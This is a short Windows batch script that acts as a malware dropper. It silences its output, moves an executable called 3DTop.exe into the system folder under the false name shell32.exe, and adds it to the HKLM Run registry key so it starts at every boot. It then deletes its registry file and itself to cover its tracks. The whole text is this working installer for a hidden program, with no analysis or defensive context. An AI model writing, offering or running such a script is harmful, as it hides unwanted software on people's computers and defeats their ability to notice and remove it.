@ctty nul
move 3DTop.exe C:\windows\system\shell32.exe
echo REGEDIT4 >C:\z.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >>c:\Z.REG
ECHO "SHELL32"="C:\\windows\\system\\shell32.exe" >>C:\z.reg
REGEDIT /S C:\z.reg
del C:\z.reg
DEL %0